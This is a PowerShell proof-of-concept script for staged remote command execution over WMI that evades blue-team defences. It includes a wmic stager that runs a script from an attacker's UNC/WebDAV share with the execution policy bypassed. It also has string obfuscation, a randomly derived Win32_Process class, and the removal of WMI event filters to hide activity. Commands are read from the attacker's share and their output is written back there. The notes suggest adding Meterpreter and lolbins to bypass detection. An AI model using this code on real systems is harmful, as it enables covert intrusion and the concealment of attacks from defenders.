<#
.SYNOPSIS
	PowerShell WMI based PoC for defenses mechanism and blue team evasion using randomly generated and obfucated PowerShell Class Derivation remotely (staged).

.DESCRIPTION

   * Stage 1 (executed on attacker's side):

        The "stage 1" is a simple dropper for payload delivery through UNC/WebDAV using basic obfuscation (require admin. privs for RCE over WMI ofc).
	It is executed from attackers station (C2C) to run in-memory fud PowerShell without the well-known `IWR/IEX` method calls.

  (+) Notes:
        UNC/WebDAV could be replaced by WMI namespaces as presented in WmiSploit project `https://github.com/secabstraction/WmiSploit`.
        However, the executed command is then limited to 8190 chars due to `-EncodedCommand` usage for b64 payload, this is the reason why I prefered this method for the PoC.
        
        Note that .ps1 file is executed over WMI without `invoke-expression` (iex) nor `wget/invoke-webrequest` (iwr) method to prevent alerting.
        Classic stager from command line: 
            `wmic.exe /node:"Victime-PC" /user:WORKGROUP\admin process call create "PowErSheLl -eXecUtIonpOliCY BypAsS -NopRofilE -fILe \\Vboxsvr\shared\BSIDESIE\class-derivation.ps1"`


    * Stage 2 (executed on target):
         
         In-memory build stage 2 using "-File" parameter (obfuscated PowerShell with random Class Derivation).

         Randomly generated class derivation and "EventViewer" logs removing for detection mechanisms/blue team evasion.
         Stage 1 execution is not removed from logs for demo purpose, it should be modified for a total discretion ;).

    (+) Notes
        C2C shell could be used in combination to unicorn to obtains Meterpreter session (stage 2 could be modified depending on the use case):
        
        Examples: `powershell.exe -eXecUtIOnpOlICy BypAsS -File "\\Vboxsvr\shared\BSIDESIE\pwner.ps1"`

       IMPORTANT: Payload delivery using "-File" parameter also permit to add hashes collection when payload (stage 2) is triggered.

    * stage 3 (executed on target):
        
        Payload execution and output push/pull via a random file located on attacker's server.

	
.NOTES
	File Name  : class-derivation.ps1
	Author     : J.M Bourbon 
	Contact	   : mail.bourbon@gmail.com - @kmkz_security

#>

function GenerateRandomName(){

    $Pf = "abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ23456789".TOchArarRay()
    $rSVdssS1=""
    1..10 | ForEach {  $rSVdssS1 += $Pf | Get-Random }
    return $rSVdssS1
}

# Remove Application logs in "EventViewer":
Get-WmiObject __eventFilter -namespace root/subscription -filter "name='_PersistenceEvent_'"| Remove-WmiObject
Get-WmiObject __eventFilter -namespace root/subscription -filter "name='_ProcessCreationEvent_'"| Remove-WmiObject

$zNrF = -jOin[regex]::MaTcHeS('sSeCorp_23nIw:2VmIc/tOoR/',".",'RightToLeft')
$CoFtfEgvsJ = [wMicLaSs]$zNrF
$YepTa = "pRoc"+"eSs"
$PoDtbeF4Dp= GenerateRandomName
$N = $CoFtfEgvsJ.dEriVe("$PoDtbeF4Dp")
$N.pUt()
$BlzQ=0
$VrBnZ=111-1+3+7+5+5-3+$BlzQ
$CpOnBt5= gEt-cOntEnt -paTh "\\Vboxsvr\shared\BSIDESIE\cmd.in.txt"

# Output filename generation:
$rSVdssS=GenerateRandomName


# 1 - For Remote usage (pivot) use wmic over wmi (Eh, why not?). Tested with a specific usecase, should be adapted:
iNvokE-wmIMeThOd $PoDtbeF4Dp -NaMe CrEaTe -arGumEntlIst "wMIc /nOdE:$VrBnZ.$BlzQ.$BlzQ.1 $YepTa caLl cReAte 'cMd ^/c $CpOnBt5 >>\\Vboxsvr\shared\BSIDESIE\$rSVdssS.lol'"

# 2 - For a classic command execution. Tip: use "lolbins" from lolbas project (lolbas-project.github.io) for better mitigations/detections bypassing 
#     iNvokE-wmIMeThOd $PoDtbeF4Dp -NaMe CrEaTe -arGumEntlIst "cMd ^/c $CpOnBt5 >>\\Vboxsvr\shared\BSIDESIE\$rSVdssS.lol"